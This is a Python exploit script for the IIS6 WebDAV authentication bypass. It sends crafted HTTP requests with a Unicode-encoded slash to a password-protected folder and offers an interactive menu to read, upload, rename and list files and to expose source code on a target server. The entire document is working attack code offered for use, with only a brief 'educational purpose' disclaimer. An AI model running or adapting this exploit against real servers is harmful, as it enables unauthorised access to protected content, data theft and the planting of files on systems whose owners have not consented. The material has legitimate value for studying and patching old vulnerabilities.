#!/usr/bin/python
# IIS6 WebDEV Authentication bypass exploit
#
# Done by Str0ss
# mail.str0ss[At]gmail[d0t]com
#
# Usage python <filename.py>
# Follow the instructions
# This exploit is made for educational purpose
#
# For this exploit to work
# 1. WebDEV should be enabled
# 2.For File upload / Dir browsing / show source
#   currosponding previlage should be enabled. 
#   Exploit will perform only auth'n bypass.
#
# Thanks to kcope

import socket

def get():
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((t_IP,t_port))
    fn = raw_input("Enter the file name to fetch:")
    req = "GET /%c0%af" + vul_fold +"/" + fn + " HTTP/1.0\r\n"
    req += "Translate: F\r\n"
    req += "Host: " + t_IP + "\r\n"
    req += "Connection: close\r\n"
    req += "\r\n\r\n"
    sock.send(req)
    data = sock.recv(1024)
    string = ""
    while len(data):
        string = string + data
        data = sock.recv(1024)
    sock.close()
    print "\n_____SERVER RESPONSE_____\n" + string
    print "\n\n USE DISPLAY SOURCE IF GET IS NOT WORKING."

#put
def put():
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((t_IP,t_port))
    file_name = raw_input("Enter the filename to upload [should be in the working dir]:")
    FILE = open(file_name)
    text = FILE.read()
    print "File content:\n" + text
    FILE.close()
    file_length = len(text)
    req = "PUT /%c0%af/" + vul_fold + "/" + file_name +" HTTP/1.0\r\n"
    req += "Connection: close\r\n"
    req += "Host: " + t_IP + "\r\n"
    req += "Content-Type: text/xml; charset='utf-8'\r\n"
    req += "Content-Length: " + str(file_length) +"\r\n\r\n"
    req += text + "\r\n"
    sock.send(req)
    data = sock.recv(1024)
    string = ""
    while len(data):
      string = string + data
      data = sock.recv(1024)
    sock.close()
    print "\n_____SERVER RESPONSE_____\n" + string

#move
def move():
    source = raw_input("Enter the source file [old.htm]:")
    target = raw_input("Enter the target file [new.htm]:")
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((t_IP,t_port))
    req = "MOVE /vul%c0%af/" + source +" HTTP/1.0\r\n"
    req += "Destination: %c0%af/vul/" + target + "\n\n"
    sock.send(req)
    data = sock.recv(1024)
    string = ""
    while len(data):
        string = string + data
        data = sock.recv(1024)
    sock.close()
    print "\n_____SERVER RESPONSE_____\n" + string

#list
def list():
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((t_IP,t_port))
    req = "PROPFIND /%c0%af" + vul_fold + " HTTP/1.0\r\n"
    req += "Connection: close\r\n"
    req += "Host: " + t_IP + "\r\n"
    req += "Content-Length: 0\r\n\r\n"
    sock.send(req)
    data = sock.recv(1024)
    string = ""
    while len(data):
        string = string + data
        data = sock.recv(1024)
    sock.close()
    print "\n_____SERVER RESPONSE_____\n" + string
    
#disp source
def disp():
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((t_IP,t_port))
    fn = raw_input("Enter the file name:")
    req = "GET /" + vul_fold +"%c0%af/" + fn + " HTTP/1.0\r\n"
    req += "Translate: f\r\n"
    req += "Connection: close\r\n"
    req += "Host: " + t_IP + "\r\n"
    req += "\r\n\r\n"
    sock.send(req)
    data = sock.recv(1024)
    string = ""
    while len(data):
        string = string + data
        data = sock.recv(1024)
    sock.close()
    print "\n_____SERVER RESPONSE_____\n" + string

#main program
t_IP = raw_input("Enter the Terget web server[IIS] IP address:")
t_port = 80  #change the port is the web server is running on different port

vul_fold = raw_input("Enter the vulnerable [password protected] folder name:")
print "Target is :" + t_IP + "/" + vul_fold
exi = 0
while(exi == 0):
    print "\n[1]  GET a file from vulnerable folder."
    print "\n[2]  PUT a file into the vulnerable folder."
    print "\n[3]  MOVE a file [Rename]"
    print "\n[4]  LIST files in a directory"
    print "\n[5]  Display the source code [Same as GET]"
    print "\n[q]  Exit"
    inp = raw_input("enter your choice:")
    if inp == '1':
        get()
    if inp == '2':
        put()
    if inp == '3':
        move()
    if inp == '4':
        list()
    if inp == '5':
        disp()
    if inp == 'q':
        exi = 1
        
print "\nThanks for using this exploit."
print "\n For any suggession / quries mailto: mail.str0ss[aT]gmail[d0t]com"
